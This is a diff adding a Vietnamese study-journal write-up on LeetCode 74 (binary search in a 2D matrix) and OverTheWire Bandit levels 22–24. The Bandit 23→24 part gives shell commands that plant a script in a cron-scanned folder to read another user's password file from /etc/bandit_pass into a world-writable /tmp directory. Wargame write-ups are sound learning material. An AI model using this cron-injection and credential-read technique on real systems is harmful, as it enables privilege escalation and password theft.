@@ -74,3 +74,77 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 Quá trình rèn luyện hôm nay là sự đối chiếu rõ nét giữa tư duy xây dựng và tư duy phá hủy:
 1. Góc nhìn Dev: Khi viết mã (như trong bài LeetCode), việc kiểm soát các trường hợp biên như Integer Overflow (tràn số) bằng cách tối ưu công thức tính mid là lớp phòng thủ đầu tiên.
 2. Góc nhìn Sec/Ops: Việc sử dụng bừa bãi quyền SUID (như bài Bandit 20) hoặc thiết lập Cron jobs với các file bash có quyền ghi (write) lỏng lẻo (như bài Bandit 22) có thể làm vô hiệu hóa mọi nỗ lực bảo mật hệ thống. Một tiến trình chạy ngầm với đặc quyền cao luôn là mục tiêu ưa thích của tin tặc để cài cắm Backdoor.
+
+
+
+
+
+# Write-up Day 02: Binary Search 2D, Cronjobs & Shell Script Injection
+
+**Date:** 08/10/2026
+**Topics:** Algorithms (Binary Search), Linux Sysadmin (Cron), Privilege Escalation, Git/GitHub.
+
+---
+
+## 1. Thuật toán: LeetCode 74 - Search a 2D Matrix
+
+**Vấn đề gặp phải:** 
+Ban đầu, tôi cố gắng áp dụng nguyên vẹn thuật toán Binary Search 1 chiều lên ma trận 2 chiều (`vector<vector<int>>`). Lỗi xảy ra khi tôi gọi `matrix[mid]` để so sánh với `target`. Trong C++, `matrix[mid]` trả về toàn bộ một mảng con (một hàng), chứ không phải một số nguyên cụ thể, dẫn đến lỗi biên dịch. Hơn nữa, tôi chưa khởi tạo số lượng hàng và cột của ma trận.
+
+**Cách giải quyết & Giải thích Pattern:**
+Để đạt độ phức tạp `O(log(m * n))`, ta phải coi ma trận 2D như một mảng 1D trải dài.
+
+1. **Khai báo kích thước:**
+   - `int m = matrix.size();` (Lấy số lượng mảng con -> Số Hàng)
+   - `int n = matrix[0].size();` (Lấy số lượng phần tử của mảng con đầu tiên -> Số Cột)
+
+2. **Ánh xạ Index (1D -> 2D):** 
+   Giả sử mảng có `n` cột. Khi con trỏ Binary Search đang ở vị trí `mid` trên "mảng 1D ảo", ta tìm tọa độ thật của nó trên ma trận bằng công thức:
+   - **Hàng (Row) = `mid / n`**: Phép chia lấy phần nguyên cho biết ta đã lướt qua bao nhiêu hàng trọn vẹn.
+   - **Cột (Col) = `mid % n`**: Phép chia lấy phần dư cho biết vị trí chính xác của phần tử đó ở hàng hiện tại.
+   
+   *Áp dụng vào code:* 
+   ```cpp
+   int mid_value = matrix[mid / n][mid % n];
+
+
+## 2. Linux Security: OverTheWire - Bandit (Level 22 -> 24)
+#  Bandit 22 → 23: Dịch ngược cơ chế sinh tên file
+Nhiệm vụ: Tìm cờ được giấu bởi một cronjob chạy ngầm.
+
+Vấn đề: File kịch bản của hệ thống sử dụng biến $myname để tạo tên file chứa mật khẩu. Khi gọi cat /tmp/$mytarget trên terminal, hệ thống báo lỗi cat: /tmp/: Is a directory vì biến rỗng (chỉ có giá trị khi script được chạy bởi cron).
+
+Cách giải quyết: Đóng giả hệ thống bằng cách tự chạy lệnh hash thủ công với user là
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+echo: In chuỗi đầu vào.
+
+| (Pipe): Chuyền chuỗi vừa in sang lệnh tiếp theo.
+
+md5sum: Mã hóa chuỗi thành mã băm 32 ký tự.
+
+cut -d ' ' -f 1: Dùng khoảng trắng (-d ' ') làm vách ngăn để cắt chuỗi, và chỉ lấy khối dữ liệu đầu tiên (-f 1), qua đó loại bỏ các ký tự rác (dấu gạch ngang) sinh ra từ hàm băm.
+#  Bandit 23 → 24: Leo thang bằng Shell Script (Payload Injection)
+Nhiệm vụ: Lợi dụng cronjob quét thư mục /var/spool/bandit24/foo (chạy mọi script bên trong với quyền bandit24 rồi xóa đi) để đánh cắp mật khẩu.
+1. Tạo Workspace an toàn:
+Tạo thư mục làm việc và cấp quyền 777 (cho phép tiến trình ngầm bandit24 có quyền ghi kết quả trả về).
+mkdir /tmp/hoanglong24
+chmod 777 /tmp/hoanglong24
+cd /tmp/hoanglong24
+2. Viết Script khai thác (Payload):
+echo '#!/bin/bash' > myscript.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/hoanglong24/password.txt' >> myscript.sh
+chmod +x myscript.sh
+#!/bin/bash (Shebang): Báo cho hệ thống biết đây là script chạy bằng Bash. Dấu > ghi đè tạo file mới.
+
+Dấu >> giúp viết nối lệnh lấy cờ vào cuối file mà không đè mất dòng Shebang.
+
+Lệnh cat bên trong script sẽ lấy quyền của bandit24 đọc file mật khẩu gốc và đẩy kết quả về thư mục trung gian của mình.
+
+chmod +x: Cấp quyền "Thực thi" (eXecute) để script chạy được.
+3. Kích hoạt bẫy:
+Copy myscript.sh vào thư mục đích /var/spool/bandit24/foo, đợi tối đa 1 phút cho cronjob chạy, sau đó đọc file password.txt để lấy cờ.
+#3. MINDSET
+Bảo mật không phải là phép thuật, mà là sự thấu hiểu hệ thống sâu sắc hơn cả người tạo ra nó. Hôm nay, khi bạn lợi dụng cronjob để đánh cắp mật khẩu trong Bandit, bạn không dùng một phần mềm hack nào phức tạp. Bạn chỉ đơn giản là hiểu rõ cách Linux tự động hóa công việc và chèn mã kịch bản vào đúng điểm mù của luồng thực thi. Đó chính là tư duy cốt lõi của lộ trình này: Nghĩ như một kẻ tấn công, nhưng hành động với sự kỷ luật của một kỹ sư hệ thống.
+
+Bài toán ma trận LeetCode 74 lại mang đến một bài học khác về sự linh hoạt trong góc nhìn. Việc trải phẳng một không gian 2D thành một đường thẳng 1D trong tâm trí chứng minh rằng nhiều chướng ngại vật kỹ thuật có thể được giải quyết rất nhanh chóng nếu ta biết cách chuyển đổi cấu trúc dữ liệu. Khả năng nhìn thấu bề mặt của hệ thống và đưa nó về dạng cơ bản nhất là kỹ năng sống còn khi bạn phải thiết kế kiến trúc DevSecOps sau này.
